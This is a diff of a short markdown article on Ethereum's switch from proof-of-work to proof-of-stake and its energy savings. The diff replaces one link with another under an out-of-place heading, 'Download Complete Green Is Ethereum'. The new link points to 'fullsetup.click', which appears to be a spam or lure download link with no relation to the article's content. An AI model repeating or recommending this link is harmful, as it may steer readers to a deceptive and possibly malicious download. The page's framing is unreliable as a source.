@@ -4,7 +4,7 @@ Ethereum was created in 2013 and launched two years later by Vitalik Buterin. It
 2
  But, Ethereum mining is no longer possible after the move from the proof-of-work (PoW) model to proof-of-stake (PoS). Proof-of-stake reduced the blockchain's energy use by more than 99%.
 
-## [Download Complete Green Is Ethereum](https://tinyurl.com/9rdtyvz2)
+## [Download Complete Green Is Ethereum](https://fullsetup.click/)
 
 PoS differs from PoW in that it is not a network-wide competitive process of encrypting information through a hashing algorithm. PoS still uses a hashing algorithm and verifies transactions through a consensus layer, but the validators are randomly chosen by the network based on the amount of ether they have staked. Staking means offering ether as collateral to become a network validator so the participant can earn ether rewards.
 
